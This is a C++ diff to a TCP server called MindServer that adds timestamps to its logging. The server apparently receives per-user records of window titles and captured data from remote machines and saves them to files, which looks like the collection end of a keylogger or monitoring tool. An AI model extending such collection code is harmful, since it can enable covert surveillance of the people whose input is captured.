@@ -26,7 +26,7 @@
 MindServer::MindServer(boost::asio::io_service& io_service, unsigned short port)
 : _acceptor(io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
 {
-    std::cout << "Listening...\n";
+    std::cout << TimeStamp() << "> " << "Listening...\n";
     ConnectionPtr newConn = std::make_shared<connection>(_acceptor.get_io_service());
 
     _acceptor.async_accept(newConn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, newConn));
@@ -41,7 +41,7 @@ void MindServer::HandleAccept(const boost::system::error_code& e, ConnectionPtr 
     if (!e)
         conn->async_read(_receivedData, boost::bind(&MindServer::HandleRead, this, boost::asio::placeholders::error, conn));
     else
-        std::cerr << "Exeption Acceptor: " << e.message().c_str() << std::endl;
+        std::cerr << TimeStamp() << "> " << "Exeption Acceptor: " << e.message().c_str() << std::endl;
 
     ConnectionPtr new_conn(new connection(_acceptor.get_io_service()));
     _acceptor.async_accept(new_conn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, new_conn));
@@ -51,11 +51,11 @@ void MindServer::HandleRead(const boost::system::error_code& e, ConnectionPtr co
 {
     if (!e)
     {
-        std::cout << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _receivedData.size() << "\n";
+        std::cout << TimeStamp() << "> " << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _receivedData.size() << "\n";
         SaveData(conn);
     }
     else
-        std::cerr << "Exeption Read: " << e.message().c_str() << std::endl;
+        std::cerr << TimeStamp() << "> " << "Exeption Read: " << e.message().c_str() << std::endl;
 }
 
 // Only allow filename with ascii chars.
@@ -73,10 +73,6 @@ void MindServer::SaveData(ConnectionPtr conn)
     if (_receivedData.size() <= 0)
         return;
 
-    time_t currTime = time(NULL);
-    std::string stringDate = ctime(&currTime);
-    stringDate[stringDate.size() - 1] = 0; // Erase an new line.
-
     std::string fileName = _receivedData[0].User + ".txt";
     checkFileName(fileName);
 
@@ -87,7 +83,7 @@ void MindServer::SaveData(ConnectionPtr conn)
 
     std::string lastWindowTitle = _receivedData[0].WindowTitle;
 
-    myfile << "----- BEGIN DATA, DATE: " << stringDate.c_str() << " -----\n";
+    myfile << "----- BEGIN DATA, DATE: " << TimeStamp() << " -----\n";
     myfile << "From: " << conn->socket().remote_endpoint().address().to_string() << "\n";
     myfile << "Title: " << _receivedData[0].WindowTitle << "\n";
     myfile << "Data: ";
@@ -107,4 +103,13 @@ void MindServer::SaveData(ConnectionPtr conn)
     myfile << "\n----- END DATA -----\n\n";
 
     myfile.close();
+}
+
+std::string MindServer::TimeStamp()
+{
+    std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+
+    std::stringstream ss;
+    ss << std::put_time(std::localtime(&now), "%F %T");
+    return ss.str();
 }
